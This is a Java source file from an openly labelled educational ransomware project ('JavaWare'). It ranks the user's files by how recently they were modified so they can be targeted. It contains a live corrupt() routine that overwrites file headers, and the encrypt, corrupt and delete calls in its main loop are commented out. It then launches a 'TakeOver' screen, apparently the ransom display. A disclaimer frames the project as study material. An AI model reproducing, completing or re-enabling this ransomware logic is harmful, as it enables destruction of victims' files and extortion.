/********************************************************************
   _____                        _        _
  |_   _|                      | |      | |
    | |   ___ _ __   __ ____ _ | |  __  | | ____ _ _ __  ___
    | | /  _ ' |\ \ / //  _ ' || | /  \ | |/  _ ' | '__/  _  \
  __/ / | (_)  | \ V / | (_)  |\ V  /\ V  /| (_)  | |  |  ___/
 \__ /  \____,_|  \_/  \____,_| \__/ \__/  \____,_|_|  \_____|


 Copyright (c) 2019 Kyra Mozley
 Created on 05/08/19
 Version 2.0

 Disclaimer: This project is purely for educational purposes
 DO NOT RUN THIS ON YOUR PERSONAL MACHINE
 EXECUTE ONLY IN A TEST ENVIRONMENT
 DO NOT USE FOR MALICIOUS ACTIVITY

 *********************************************************************/


package RansomeWare;

import javafx.application.Application;

import java.io.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.Date;
import java.util.HashMap;

import static java.util.Map.Entry.comparingByValue;
import static java.util.stream.Collectors.toMap;

public class FileScore {

    HashMap<String, Double> FileScore = new HashMap<>();
    AES aes;
    public void FileScore() throws Exception {
        aes = new AES();
        File in = new File(System.getProperty("user.home") +  File.separator + "output.txt");

        try(BufferedReader br = new BufferedReader(new FileReader(in))) {
            String line;
            while((line = br.readLine()) != null) {
                String[] lineIn = line.split(",\\s* ");
                File file = new File(lineIn[0]);
                double gamma = 0.0;
                for(int i=1; i<lineIn.length; i++) {
                    try {
                        double betai = Double.parseDouble(lineIn[i]);
                        gamma += betai;
                    } catch(NumberFormatException e) {
                        continue;
                    }
                }
                FileScore.put(file.getAbsolutePath(), gamma);

            }
            HashMap<String, Double> newdirectoryScore = FileScore.entrySet().stream().sorted(
                    comparingByValue()).collect(toMap(e -> e.getKey(), e-> e.getValue(), (e1, e2) -> e2, LinkedHashMap::new));

            for(String f: newdirectoryScore.keySet()) {
                File file = new File(f);
                //aes.encrypt(file);
                //corrupt(file);
                //file.delete();
            }
            Application.launch(TakeOver.class, "JavaWare");

        }

    }

    public double calculateBeta(File file) {

        long lastModified = file.lastModified();
        Date lastModDate = new Date(lastModified);

        //recency
        //working out how to score it
        long currentTimeMillis = System.currentTimeMillis();
        Date current = new Date(currentTimeMillis);

        Date BUCKET_1 = new Date(currentTimeMillis- TimeUnit.DAYS.toMillis(1));
        Date BUCKET_2 = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(5));
        Date BUCKET_3 = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(10));
        Date BUCKET_4 = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(30));
        Date BUCKET_5 = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(90));

        double BUCKET_1_SCORE = 1;
        double BUCKET_2_SCORE = 0.9;
        double BUCKET_3_SCORE = 0.7;
        double BUCKET_4_SCORE = 0.4;
        double BUCKET_5_SCORE = 0.1;

        double p = (lastModDate.after(BUCKET_1)) ? BUCKET_1_SCORE:
                (lastModDate.after(BUCKET_2)) ? BUCKET_2_SCORE:
                        (lastModDate.after(BUCKET_3)) ? BUCKET_3_SCORE:
                                (lastModDate.after(BUCKET_4)) ? BUCKET_4_SCORE:
                                        (lastModDate.after(BUCKET_5)) ? BUCKET_5_SCORE: 0.0;

        //calculate frequency
        //a = time since last accessed in hrs
        long hoursDiff = (currentTimeMillis - lastModified)/(1000*60*60);
        double a = (double) hoursDiff;

        //the decay constant is ln2/30 (30 days for decay)
        double lambda = Math.log(2) / 30;

        double beta = p * Math.exp(-lambda * a);

        return beta;
    }

    public void corrupt(File f) throws Exception {
        RandomAccessFile rf = new RandomAccessFile(f, "rw");
        rf.seek(0);
        byte[] head = new byte[]{'a', 'Z', '1', '.', 't'};
        rf.write(head);

    }

}
